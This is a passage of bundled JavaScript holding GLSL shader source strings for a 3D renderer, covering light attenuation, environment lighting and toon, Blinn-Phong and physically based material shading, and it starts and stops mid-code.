	result += shCoefficients[ 6 ] * ( 0.743125 * z * z - 0.247708 );
	result += shCoefficients[ 7 ] * 2.0 * 0.429043 * x * z;
	result += shCoefficients[ 8 ] * 0.429043 * ( x * x - y * y );
	return result;
}
vec3 getLightProbeIrradiance( const in vec3 lightProbe[ 9 ], const in vec3 normal ) {
	vec3 worldNormal = inverseTransformDirection( normal, viewMatrix );
	vec3 irradiance = shGetIrradianceAt( worldNormal, lightProbe );
	return irradiance;
}
vec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {
	vec3 irradiance = ambientLightColor;
	return irradiance;
}
float getDistanceAttenuation( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {
	#if defined ( LEGACY_LIGHTS )
		if ( cutoffDistance > 0.0 && decayExponent > 0.0 ) {
			return pow( saturate( - lightDistance / cutoffDistance + 1.0 ), decayExponent );
		}
		return 1.0;
	#else
		float distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );
		if ( cutoffDistance > 0.0 ) {
			distanceFalloff *= pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );
		}
		return distanceFalloff;
	#endif
}
float getSpotAttenuation( const in float coneCosine, const in float penumbraCosine, const in float angleCosine ) {
	return smoothstep( coneCosine, penumbraCosine, angleCosine );
}
#if NUM_DIR_LIGHTS > 0
	struct DirectionalLight {
		vec3 direction;
		vec3 color;
	};
	uniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];
	void getDirectionalLightInfo( const in DirectionalLight directionalLight, out IncidentLight light ) {
		light.color = directionalLight.color;
		light.direction = directionalLight.direction;
		light.visible = true;
	}
#endif
#if NUM_POINT_LIGHTS > 0
	struct PointLight {
		vec3 position;
		vec3 color;
		float distance;
		float decay;
	};
	uniform PointLight pointLights[ NUM_POINT_LIGHTS ];
	void getPointLightInfo( const in PointLight pointLight, const in vec3 geometryPosition, out IncidentLight light ) {
		vec3 lVector = pointLight.position - geometryPosition;
		light.direction = normalize( lVector );
		float lightDistance = length( lVector );
		light.color = pointLight.color;
		light.color *= getDistanceAttenuation( lightDistance, pointLight.distance, pointLight.decay );
		light.visible = ( light.color != vec3( 0.0 ) );
	}
#endif
#if NUM_SPOT_LIGHTS > 0
	struct SpotLight {
		vec3 position;
		vec3 direction;
		vec3 color;
		float distance;
		float decay;
		float coneCos;
		float penumbraCos;
	};
	uniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];
	void getSpotLightInfo( const in SpotLight spotLight, const in vec3 geometryPosition, out IncidentLight light ) {
		vec3 lVector = spotLight.position - geometryPosition;
		light.direction = normalize( lVector );
		float angleCos = dot( light.direction, spotLight.direction );
		float spotAttenuation = getSpotAttenuation( spotLight.coneCos, spotLight.penumbraCos, angleCos );
		if ( spotAttenuation > 0.0 ) {
			float lightDistance = length( lVector );
			light.color = spotLight.color * spotAttenuation;
			light.color *= getDistanceAttenuation( lightDistance, spotLight.distance, spotLight.decay );
			light.visible = ( light.color != vec3( 0.0 ) );
		} else {
			light.color = vec3( 0.0 );
			light.visible = false;
		}
	}
#endif
#if NUM_RECT_AREA_LIGHTS > 0
	struct RectAreaLight {
		vec3 color;
		vec3 position;
		vec3 halfWidth;
		vec3 halfHeight;
	};
	uniform sampler2D ltc_1;	uniform sampler2D ltc_2;
	uniform RectAreaLight rectAreaLights[ NUM_RECT_AREA_LIGHTS ];
#endif
#if NUM_HEMI_LIGHTS > 0
	struct HemisphereLight {
		vec3 direction;
		vec3 skyColor;
		vec3 groundColor;
	};
	uniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];
	vec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in vec3 normal ) {
		float dotNL = dot( normal, hemiLight.direction );
		float hemiDiffuseWeight = 0.5 * dotNL + 0.5;
		vec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );
		return irradiance;
	}
#endif`,od=`#ifdef USE_ENVMAP
	vec3 getIBLIrradiance( const in vec3 normal ) {
		#ifdef ENVMAP_TYPE_CUBE_UV
			vec3 worldNormal = inverseTransformDirection( normal, viewMatrix );
			vec4 envMapColor = textureCubeUV( envMap, worldNormal, 1.0 );
			return PI * envMapColor.rgb * envMapIntensity;
		#else
			return vec3( 0.0 );
		#endif
	}
	vec3 getIBLRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness ) {
		#ifdef ENVMAP_TYPE_CUBE_UV
			vec3 reflectVec = reflect( - viewDir, normal );
			reflectVec = normalize( mix( reflectVec, normal, roughness * roughness) );
			reflectVec = inverseTransformDirection( reflectVec, viewMatrix );
			vec4 envMapColor = textureCubeUV( envMap, reflectVec, roughness );
			return envMapColor.rgb * envMapIntensity;
		#else
			return vec3( 0.0 );
		#endif
	}
	#ifdef USE_ANISOTROPY
		vec3 getIBLAnisotropyRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness, const in vec3 bitangent, const in float anisotropy ) {
			#ifdef ENVMAP_TYPE_CUBE_UV
				vec3 bentNormal = cross( bitangent, viewDir );
				bentNormal = normalize( cross( bentNormal, bitangent ) );
				bentNormal = normalize( mix( bentNormal, normal, pow2( pow2( 1.0 - anisotropy * ( 1.0 - roughness ) ) ) ) );
				return getIBLRadiance( viewDir, bentNormal, roughness );
			#else
				return vec3( 0.0 );
			#endif
		}
	#endif
#endif`,ld=`ToonMaterial material;
material.diffuseColor = diffuseColor.rgb;`,cd=`varying vec3 vViewPosition;
struct ToonMaterial {
	vec3 diffuseColor;
};
void RE_Direct_Toon( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {
	vec3 irradiance = getGradientIrradiance( geometryNormal, directLight.direction ) * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
void RE_IndirectDiffuse_Toon( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_Toon
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Toon`,dd=`BlinnPhongMaterial material;
material.diffuseColor = diffuseColor.rgb;
material.specularColor = specular;
material.specularShininess = shininess;
material.specularStrength = specularStrength;`,ud=`varying vec3 vViewPosition;
struct BlinnPhongMaterial {
	vec3 diffuseColor;
	vec3 specularColor;
	float specularShininess;
	float specularStrength;
};
void RE_Direct_BlinnPhong( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
	reflectedLight.directSpecular += irradiance * BRDF_BlinnPhong( directLight.direction, geometryViewDir, geometryNormal, material.specularColor, material.specularShininess ) * material.specularStrength;
}
void RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_BlinnPhong
#define RE_IndirectDiffuse		RE_IndirectDiffuse_BlinnPhong`,pd=`PhysicalMaterial material;
material.diffuseColor = diffuseColor.rgb * ( 1.0 - metalnessFactor );
vec3 dxy = max( abs( dFdx( nonPerturbedNormal ) ), abs( dFdy( nonPerturbedNormal ) ) );
float geometryRoughness = max( max( dxy.x, dxy.y ), dxy.z );
material.roughness = max( roughnessFactor, 0.0525 );material.roughness += geometryRoughness;
material.roughness = min( material.roughness, 1.0 );
#ifdef IOR
	material.ior = ior;
	#ifdef USE_SPECULAR
		float specularIntensityFactor = specularIntensity;
		vec3 specularColorFactor = specularColor;
		#ifdef USE_SPECULAR_COLORMAP
			specularColorFactor *= texture2D( specularColorMap, vSpecularColorMapUv ).rgb;
		#endif
		#ifdef USE_SPECULAR_INTENSITYMAP
			specularIntensityFactor *= texture2D( specularIntensityMap, vSpecularIntensityMapUv ).a;
		#endif
		material.specularF90 = mix( specularIntensityFactor, 1.0, metalnessFactor );
	#else
		float specularIntensityFactor = 1.0;
		vec3 specularColorFactor = vec3( 1.0 );
		material.specularF90 = 1.0;
	#endif
	material.specularColor = mix( min( pow2( ( material.ior - 1.0 ) / ( material.ior + 1.0 ) ) * specularColorFactor, vec3( 1.0 ) ) * specularIntensityFactor, diffuseColor.rgb, metalnessFactor );
#else
	material.specularColor = mix( vec3( 0.04 ), diffuseColor.rgb, metalnessFactor );
	material.specularF90 = 1.0;
#endif
#ifdef USE_CLEARCOAT
	material.clearcoat = clearcoat;
	material.clearcoatRoughness = clearcoatRoughness;
	material.clearcoatF0 = vec3( 0.04 );
	material.clearcoatF90 = 1.0;
	#ifdef USE_CLEARCOATMAP
		material.clearcoat *= texture2D( clearcoatMap, vClearcoatMapUv ).x;
	#endif
	#ifdef USE_CLEARCOAT_ROUGHNESSMAP
		material.clearcoatRoughness *= texture2D( clearcoatRoughnessMap, vClearcoatRoughnessMapUv ).y;
	#endif
	material.clearcoat = saturate( material.clearcoat );	material.clearcoatRoughness = max( material.clearcoatRoughness, 0.0525 );
	material.clearcoatRoughness += geometryRoughness;
	material.clearcoatRoughness = min( material.clearcoatRoughness, 1.0 );
#endif
#ifdef USE_IRIDESCENCE
	material.iridescence = iridescence;
	material.iridescenceIOR = iridescenceIOR;
	#ifdef USE_IRIDESCENCEMAP
		material.iridescence *= texture2D( iridescenceMap, vIridescenceMapUv ).r;
	#endif
	#ifdef USE_IRIDESCENCE_THICKNESSMAP
		material.iridescenceThickness = (iridescenceThicknessMaximum - iridescenceThicknessMinimum) * texture2D( iridescenceThicknessMap, vIridescenceThicknessMapUv ).g + iridescenceThicknessMinimum;
	#else
		material.iridescenceThickness = iridescenceThicknessMaximum;
	#endif
#endif
#ifdef USE_SHEEN
	material.sheenColor = sheenColor;
	#ifdef USE_SHEEN_COLORMAP
		material.sheenColor *= texture2D( sheenColorMap, vSheenColorMapUv ).rgb;
	#endif
	material.sheenRoughness = clamp( sheenRoughness, 0.07, 1.0 );
	#ifdef USE_SHEEN_ROUGHNESSMAP
		material.sheenRoughness *= texture2D( sheenRoughnessMap, vSheenRoughnessMapUv ).a;
	#endif
#endif
#ifdef USE_ANISOTROPY
	#ifdef USE_ANISOTROPYMAP
		mat2 anisotropyMat = mat2( anisotropyVector.x, anisotropyVector.y, - anisotropyVector.y, anisotropyVector.x );
		vec3 anisotropyPolar = texture2D( anisotropyMap, vAnisotropyMapUv ).rgb;
		vec2 anisotropyV = anisotropyMat * normalize( 2.0 * anisotropyPolar.rg - vec2( 1.0 ) ) * anisotropyPolar.b;
	#else
		vec2 anisotropyV = anisotropyVector;
	#endif
	material.anisotropy = length( anisotropyV );
	if( material.anisotropy == 0.0 ) {
		anisotropyV = vec2( 1.0, 0.0 );
	} else {
		anisotropyV /= material.anisotropy;
		material.anisotropy = saturate( material.anisotropy );
	}
	material.alphaT = mix( pow2( material.roughness ), 1.0, pow2( material.anisotropy ) );
	material.anisotropyT = tbn[ 0 ] * anisotropyV.x + tbn[ 1 ] * anisotropyV.y;
	material.anisotropyB = tbn[ 1 ] * anisotropyV.x - tbn[ 0 ] * anisotropyV.y;
#endif`,fd=`struct PhysicalMaterial {
	vec3 diffuseColor;
	float roughness;
	vec3 specularColor;
	float specularF90;
	#ifdef USE_CLEARCOAT
		float clearcoat;
		float clearcoatRoughness;
		vec3 clearcoatF0;
		float clearcoatF90;
	#endif
	#ifdef USE_IRIDESCENCE
		float iridescence;
		float iridescenceIOR;
		float iridescenceThickness;
		vec3 iridescenceFresnel;
		vec3 iridescenceF0;
	#endif
	#ifdef USE_SHEEN
		vec3 sheenColor;
		float sheenRoughness;
	#endif
	#ifdef IOR
		float ior;
	#endif
	#ifdef USE_TRANSMISSION
		float transmission;
		float transmissionAlpha;
		float thickness;
		float attenuationDistance;
		vec3 attenuationColor;
	#endif
	#ifdef USE_ANISOTROPY
		float anisotropy;
		float alphaT;
		vec3 anisotropyT;
		vec3 anisotropyB;
	#endif
};
vec3 clearcoatSpecularDirect = vec3( 0.0 );
vec3 clearcoatSpecularIndirect = vec3( 0.0 );
vec3 sheenSpecularDirect = vec3( 0.0 );
vec3 sheenSpecularIndirect = vec3(0.0 );
vec3 Schlick_to_F0( const in vec3 f, const in float f90, const in float dotVH ) {
    float x = clamp( 1.0 - dotVH, 0.0, 1.0 );
    float x2 = x * x;
    float x5 = clamp( x * x2 * x2, 0.0, 0.9999 );
    return ( f - vec3( f90 ) * x5 ) / ( 1.0 - x5 );
}
float V_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {
	float a2 = pow2( alpha );
	float gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );
	float gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );
	return 0.5 / max( gv + gl, EPSILON );
}
float D_GGX( const in float alpha, const in float dotNH ) {
	float a2 = pow2( alpha );
	float denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;
	return RECIPROCAL_PI * a2 / pow2( denom );
}
#ifdef USE_ANISOTROPY
	float V_GGX_SmithCorrelated_Anisotropic( const in float alphaT, const in float alphaB, const in float dotTV, const in float dotBV, const in float dotTL, const in float dotBL, const in float dotNV, const in float dotNL ) {
		float gv = dotNL * length( vec3( alphaT * dotTV, alphaB * dotBV, dotNV ) );
		float gl = dotNV * length( vec3( alphaT * dotTL, alphaB * dotBL, dotNL ) );
		float v = 0.5 / ( gv + gl );
		return saturate(v);
	}
	float D_GGX_Anisotropic( const in float alphaT, const in float alphaB, const in float dotNH, const in float dotTH, const in float dotBH ) {
		float a2 = alphaT * alphaB;
		highp vec3 v = vec3( alphaB * dotTH, alphaT * dotBH, a2 * dotNH );
		highp float v2 = dot( v, v );
		float w2 = a2 / v2;
		return RECIPROCAL_PI * a2 * pow2 ( w2 );
	}
#endif
#ifdef USE_CLEARCOAT
	vec3 BRDF_GGX_Clearcoat( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in PhysicalMaterial material) {
		vec3 f0 = material.clearcoatF0;
		float f90 = material.clearcoatF90;
		float roughness = material.clearcoatRoughness;
		float alpha = pow2( roughness );
		vec3 halfDir = normalize( lightDir + viewDir );
		float dotNL = saturate( dot( normal, lightDir ) );
		float dotNV = saturate( dot( normal, viewDir ) );
		float dotNH = saturate( dot( normal, halfDir ) );
		float dotVH = saturate( dot( viewDir, halfDir ) );
		vec3 F = F_Schlick( f0, f90, dotVH );
		float V = V_GGX_SmithCorrelated( alpha, dotNL, dotNV );
		float D = D_GGX( alpha, dotNH );
		return F * ( V * D );
	}
#endif
vec3 BRDF_GGX( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in PhysicalMaterial material ) {
	vec3 f0 = material.specularColor;
	float f90 = material.specularF90;
	float roughness = material.roughness;
	float alpha = pow2( roughness );
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNL = saturate( dot( normal, lightDir ) );
	float dotNV = saturate( dot( normal, viewDir ) );
	float dotNH = saturate( dot( normal, halfDir ) );
	float dotVH = saturate( dot( viewDir, halfDir ) );
	vec3 F = F_Schlick( f0, f90, dotVH );
	#ifdef USE_IRIDESCENCE
		F = mix( F, material.iridescenceFresnel, material.iridescence );
	#endif
	#ifdef USE_ANISOTROPY
		float dotTL = dot( material.anisotropyT, lightDir );
		float dotTV = dot( material.anisotropyT, viewDir );
		float dotTH = dot( material.anisotropyT, halfDir );
		float dotBL = dot( material.anisotropyB, lightDir );
		float dotBV = dot( material.anisotropyB, viewDir );
		float dotBH = dot( material.anisotropyB, halfDir );
		float V = V_GGX_SmithCorrelated_Anisotropic( material.alphaT, alpha, dotTV, dotBV, dotTL, dotBL, dotNV, dotNL );
		float D = D_GGX_Anisotropic( material.alphaT, alpha, dotNH, dotTH, dotBH );
	#else
		float V = V_GGX_SmithCorrelated( alpha, dotNL, dotNV );
		float D = D_GGX( alpha, dotNH );
	#endif
	return F * ( V * D );
}
vec2 LTC_Uv( const in vec3 N, const in vec3 V, const in float roughness ) {
	const float LUT_SIZE = 64.0;
	const float LUT_SCALE = ( LUT_SIZE - 1.0 ) / LUT_SIZE;
	const float LUT_BIAS = 0.5 / LUT_SIZE;
	float dotNV = saturate( dot( N, V ) );
	vec2 uv = vec2( roughness, sqrt( 1.0 - dotNV ) );
	uv = uv * LUT_SCALE + LUT_BIAS;
	return uv;
}
float LTC_ClippedSphereFormFactor( const in vec3 f ) {
	float l = length( f );
	return max( ( l * l + f.z ) / ( l + 1.0 ), 0.0 );
}
vec3 LTC_EdgeVectorFormFactor( const in vec3 v1, const in vec3 v2 ) {
	float x = dot( v1, v2 );
	float y = abs( x );
	float a = 0.8543985 + ( 0.4965155 + 0.0145206 * y ) * y;
	float b = 3.4175940 + ( 4.1616724 + y ) * y;
	float v = a / b;
	float theta_sintheta = ( x > 0.0 ) ? v : 0.5 * inversesqrt( max( 1.0 - x * x, 1e-7 ) ) - v;
	return cross( v1, v2 ) * theta_sintheta;
}
vec3 LTC_Evaluate( const in vec3 N, const in vec3 V, const in vec3 P, const in mat3 mInv, const in vec3 rectCoords[ 4 ] ) {
	vec3 v1 = rectCoords[ 1 ] - rectCoords[ 0 ];
	vec3 v2 = rectCoords[ 3 ] - rectCoords[ 0 ];
	vec3 lightNormal = cross( v1, v2 );
	if( dot( lightNormal, P - rectCoords[ 0 ] ) < 0.0 ) return vec3( 0.0 );
	vec3 T1, T2;
	T1 = normalize( V - N * dot( V, N ) );
	T2 = - cross( N, T1 );
	mat3 mat = mInv * transposeMat3( mat3( T1, T2, N ) );
	vec3 coords[ 4 ];
	coords[ 0 ] = mat * ( rectCoords[ 0 ] - P );
	coords[ 1 ] = mat * ( rectCoords[ 1 ] - P );
	coords[ 2 ] = mat * ( rectCoords[ 2 ] - P );
	coords[ 3 ] = mat * ( rectCoords[ 3 ] - P );
	coords[ 0 ] = normalize( coords[ 0 ] );
	coords[ 1 ] = normalize( coords[ 1 ] );
	coords[ 2 ] = normalize( coords[ 2 ] );
	coords[ 3 ] = normalize( coords[ 3 ] );
	vec3 vectorFormFactor = vec3( 0.0 );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 0 ], coords[ 1 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 1 ], coords[ 2 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 2 ], coords[ 3 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 3 ], coords[ 0 ] );
	float result = LTC_ClippedSphereFormFactor( vectorFormFactor );
	return vec3( result );
}
#if defined( USE_SHEEN )
float D_Charlie( float roughness, float dotNH ) {
	float alpha = pow2( roughness );
	float invAlpha = 1.0 / alpha;
	float cos2h = dotNH * dotNH;
	float sin2h = max( 1.0 - cos2h, 0.0078125 );
	return ( 2.0 + invAlpha ) * pow( sin2h, invAlpha * 0.5 ) / ( 2.0 * PI );
}
float V_Neubelt( float dotNV, float dotNL ) {
	return saturate( 1.0 / ( 4.0 * ( dotNL + dotNV - dotNL * dotNV ) ) );
}
vec3 BRDF_Sheen( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, vec3 sheenColor, const in float sheenRoughness ) {
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNL = saturate( dot( normal, lightDir ) );
	float dotNV = saturate( dot( normal, viewDir ) );
	float dotNH = saturate( dot( normal, halfDir ) );
	float D = D_Charlie( sheenRoughness, dotNH );
	float V = V_Neubelt( dotNV, dotNL );
	return sheenColor * ( D * V );
}
#endif
float IBLSheenBRDF( const in vec3 normal, const in vec3 viewDir, const in float roughness ) {
	float dotNV = saturate( dot( normal, viewDir ) );
	float r2 = roughness * roughness;
	float a = roughness < 0.25 ? -339.2 * r2 + 161.4 * roughness - 25.9 : -8.48 * r2 + 14.3 * roughness - 9.95;
	float b = roughness < 0.25 ? 44.0 * r2 - 23.7 * roughness + 3.26 : 1.97 * r2 - 3.27 * roughness + 0.72;
	float DG = exp( a * dotNV + b ) + ( roughness < 0.25 ? 0.0 : 0.1 * ( roughness - 0.25 ) );
	return saturate( DG * RECIPROCAL_PI );
}
vec2 DFGApprox( const in vec3 normal, const in vec3 viewDir, const in float roughness ) {
	float dotNV = saturate( dot( normal, viewDir ) );
	const vec4 c0 = vec4( - 1, - 0.0275, - 0.572, 0.022 );
	const vec4 c1 = vec4( 1, 0.0425, 1.04, - 0.04 );
	vec4 r = roughness * c0 + c1;
	float a004 = min( r.x * r.x, exp2( - 9.28 * dotNV ) ) * r.x + r.y;
	vec2 fab = vec2( - 1.04, 1.04 ) * a004 + r.zw;
	return fab;
}
vec3 EnvironmentBRDF( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float roughness ) {
	vec2 fab = DFGApprox( normal, viewDir, roughness );
	return specularColor * fab.x + specularF90 * fab.y;
}
#ifdef USE_IRIDESCENCE
void computeMultiscatteringIridescence( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float iridescence, const in vec3 iridescenceF0, const in float roughness, inout vec3 singleScatter, inout vec3 multiScatter ) {
#else
void computeMultiscattering( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float roughness, inout vec3 singleScatter, inout vec3 multiScatter ) {
#endif
	vec2 fab = DFGApprox( normal, viewDir, roughness );
	#ifdef USE_IRIDESCENCE
		vec3 Fr = mix( specularColor, iridescenceF0, iridescence );
	#else
		vec3 Fr = specularColor;
	#endif
	vec3 FssEss = Fr * fab.x + specularF90 * fab.y;
	float Ess = fab.x + fab.y;
	float Ems = 1.0 - Ess;
	vec3 Favg = Fr + ( 1.0 - Fr ) * 0.047619;	vec3 Fms = FssEss * Favg / ( 1.0 - Ems * Favg );
	singleScatter += FssEss;
	multiScatter += Fms * Ems;
}
#if NUM_RECT_AREA_LIGHTS > 0
	void RE_Direct_RectArea_Physical( const in RectAreaLight rectAreaLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
		vec3 normal = geometryNormal;
		vec3 viewDir = geometryViewDir;
		vec3 position = geometryPosition;
		vec3 lightPos = rectAreaLight.position;
		vec3 halfWidth = rectAreaLight.halfWidth;
		vec3 halfHeight = rectAreaLight.halfHeight;
		vec3 lightColor = rectAreaLight.color;
		float roughness = material.roughness;
		vec3 rectCoords[ 4 ];
		rectCoords[ 0 ] = lightPos + halfWidth - halfHeight;		rectCoords[ 1 ] = lightPos - halfWidth - halfHeight;
		rectCoords[ 2 ] = lightPos - halfWidth + halfHeight;
		rectCoords[ 3 ] = lightPos + halfWidth + halfHeight;
		vec2 uv = LTC_Uv( normal, viewDir, roughness );
		vec4 t1 = texture2D( ltc_1, uv );
		vec4 t2 = texture2D( ltc_2, uv );
		mat3 mInv = mat3(
			vec3( t1.x, 0, t1.y ),
			vec3(    0, 1,    0 ),
			vec3( t1.z, 0, t1.w )
		);
		vec3 fresnel = ( material.specularColor * t2.x + ( vec3( 1.0 ) - material.specularColor ) * t2.y );
		reflectedLight.directSpecular += lightColor * fresnel * LTC_Evaluate( normal, viewDir, position, mInv, rectCoords );
		reflectedLight.directDiffuse += lightColor * material.diffuseColor * LTC_Evaluate( normal, viewDir, position, mat3( 1.0 ), rectCoords );
	}
#endif
void RE_Direct_Physical( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	#ifdef USE_CLEARCOAT
		float dotNLcc = saturate( dot( geometryClearcoatNormal, directLight.direction ) );
		vec3 ccIrradiance = dotNLcc * directLight.color;
		clearcoatSpecularDirect += ccIrradiance * BRDF_GGX_Clearcoat( directLight.direction, geometryViewDir, geometryClearcoatNormal, material );
	#endif
	#ifdef USE_SHEEN
		sheenSpecularDirect += irradiance * BRDF_Sheen( directLight.direction, geometryViewDir, geometryNormal, material.sheenColor, material.sheenRoughness );
	#endif
	reflectedLight.directSpecular += irradiance * BRDF_GGX( directLight.direction, geometryViewDir, geometryNormal, material );
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
void RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
void RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 irradiance, const in vec3 clearcoatRadiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight) {
	#ifdef USE_CLEARCOAT
		clearcoatSpecularIndirect += clearcoatRadiance * EnvironmentBRDF( geometryClearcoatNormal, geometryViewDir, material.clearcoatF0, material.clearcoatF90, material.clearcoatRoughness );
	#endif
	#ifdef USE_SHEEN
		sheenSpecularIndirect += irradiance * material.sheenColor * IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness );
	#endif
	vec3 singleScattering = vec3( 0.0 );
	vec3 multiScattering = vec3( 0.0 );
	vec3 cosineWeightedIrradiance = irradiance * RECIPROCAL_PI;
	#ifdef USE_IRIDESCENCE
		computeMultiscatteringIridescence( geometryNormal, geometryViewDir, material.specularColor, material.specularF90, material.iridescence, material.iridescenceFresnel, material.roughness, singleScattering, multiScattering );
	#else
		computeMultiscattering( geometryNormal, geometryViewDir, material.specularColor, material.specularF90, material.roughness, singleScattering, multiScattering );
	#endif
	vec3 totalScattering = singleScattering + multiScattering;
	vec3 diffuse = material.diffuseColor * ( 1.0 - max( max( totalScattering.r, totalScattering.g ), totalScattering.b ) );
	reflectedLight.indirectSpecular += radiance * singleScattering;
	reflectedLight.indirectSpecular += multiScattering * cosineWeightedIrradiance;
	reflectedLight.indirectDiffuse += diffuse * cosineWeightedIrradiance;
}
#define RE_Direct				RE_Direct_Physical
#define RE_Direct_RectArea		RE_Direct_RectArea_Physical
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Physical
#define RE_IndirectSpecular		RE_IndirectSpecular_Physical
float computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {
	return saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );
}`,hd=`
vec3 geometryPosition = - vViewPosition;
vec3 geometryNormal = normal;
vec3 geometryViewDir = ( isOrthographic ) ? vec3( 0, 0, 1 ) : normalize( vViewPosition );
vec3 geometryClearcoatNormal = vec3( 0.0 );
#ifdef USE_CLEARCOAT
	geometryClearcoatNormal = clearcoatNormal;
#endif
#ifdef USE_IRIDESCENCE
	float dotNVi = saturate( dot( normal, geometryViewDir ) );
	if ( material.iridescenceThickness == 0.0 ) {
		material.iridescence = 0.0;
	} else {
		material.iridescence = saturate( material.iridescence );
	}
	if ( material.iridescence > 0.0 ) {
		material.iridescenceFresnel = evalIridescence( 1.0, material.iridescenceIOR, dotNVi, material.iridescenceThickness, material.specularColor );
		material.iridescenceF0 = Schlick_to_F0( material.iridescenceFresnel, 1.0, dotNVi );
	}
#endif
IncidentLight directLight;
#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )
	PointLight pointLight;
	#if defined( USE_SHADOWMAP ) && NUM_POINT_LIGHT_SHADOWS > 0
	PointLightShadow pointLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {
		pointLight = pointLights[ i ];
		getPointLightInfo( pointLight, geometryPosition, directLight );
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_POINT_LIGHT_SHADOWS )
		pointLightShadow = pointLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getPointShadow( pointShadowMap[ i ], pointLightShadow.shadowMapSize, pointLightShadow.shadowBias, pointLightShadow.shadowRadius, vPointShadowCoord[ i ], pointLightShadow.shadowCameraNear, pointLightShadow.shadowCameraFar ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )
	SpotLight spotLight;
	vec4 spotColor;
	vec3 spotLightCoord;
	bool inSpotLightMap;
	#if defined( USE_SHADOWMAP ) && NUM_SPOT_LIGHT_SHADOWS > 0
	SpotLightShadow spotLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {
		spotLight = spotLights[ i ];
		getSpotLightInfo( spotLight, geometryPosition, directLight );
		#if ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS )
